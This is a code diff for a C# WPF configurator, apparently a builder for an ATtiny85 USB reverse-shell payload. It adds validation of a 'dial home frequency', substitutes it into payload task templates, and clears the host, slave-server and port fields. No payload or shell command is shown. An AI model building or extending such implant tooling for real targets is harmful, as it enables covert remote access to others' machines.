@@ -510,7 +510,11 @@ namespace attiny85_rshell {
         private void PayloadConfBackButton(object sender, RoutedEventArgs e) {
             System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
             System.Windows.Controls.Panel.SetZIndex(payload_conf_canvas, 0);
-            
+            host_fqdn_wan_textbox.Text = "";
+            local_host_path_test_display.Text = "";
+            dial_home_frequency.Text = "";
+            slave_server_textbox.Text = "";
+            slave_server_port_textbox.Text = "";
         }
         private void PayloadConfigureButtonClick(object sender, RoutedEventArgs e) {
             System.Windows.Controls.Panel.SetZIndex(landing_page, 0);
@@ -549,10 +553,22 @@ namespace attiny85_rshell {
                 System.Windows.MessageBox.Show("Slave port field cannot be empty", "Empty Entry", MessageBoxButton.OK, MessageBoxImage.Error);
                 return;
             }
+            if (dial_home_frequency.Text == "") {
+                System.Windows.MessageBox.Show("The Dial Back Frequency field cannot be empty. Only accepts an intger value in minutes greater than zero.","Error", MessageBoxButton.OK, MessageBoxImage.Error);
+                return;
+            }
+
+            try {
+                Int64.Parse(dial_home_frequency.Text);
+            } catch {
+                System.Windows.MessageBox.Show("Failed to parse Dial home frequency into valid number of minutes.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+                return;
+            }
 
 
             FlowDocument myFlowDoc = new FlowDocument();
             Regex re_port = new Regex(@"(.*)<OS_PORT>(.*)");
+            Regex re_dial = new Regex(@"(.*)<DIAL_FREQUENCY>(.*)");
             Regex re_dom = new Regex(@"(.*)<HOST_DOMAIN>(.*)");
             Regex re_slave_server = new Regex(@"(.*)<SLAVE_SERVER_DOMAIN>(.*)");
             Regex re_proto_catch = new Regex(@"(https://|http://)(.+)");
@@ -574,7 +590,11 @@ namespace attiny85_rshell {
                     if (re_dom.IsMatch(tsk_lines[i])) {
                         tsk_lines[i] = (re_dom.Replace(tsk_lines[i], "$1") + host_fqdn_wan_textbox.Text + re_dom.Replace(tsk_lines[i], "$2"));
                         changes_made = true;
-                        break;
+
+                    }
+                    if (re_dial.IsMatch(tsk_lines[i])) {
+                        tsk_lines[i] = (re_dial.Replace(tsk_lines[i], "$1") + dial_home_frequency.Text + re_dial.Replace(tsk_lines[i], "$2"));
+                        changes_made = true;
                     }
                 }
                 if (changes_made) {
@@ -672,6 +692,11 @@ namespace attiny85_rshell {
             landing_page_log.Document = myFlowDoc;
             System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
             System.Windows.Controls.Panel.SetZIndex(payload_conf_canvas, 0);
+            host_fqdn_wan_textbox.Text = "";
+            local_host_path_test_display.Text = "";
+            dial_home_frequency.Text = "";
+            slave_server_textbox.Text = "";
+            slave_server_port_textbox.Text = "";
         }
         private void PayloadLocalHostCheckboxClick(object sender, RoutedEventArgs e) {
             if (local_hosting_checkbox.IsChecked ?? false) {
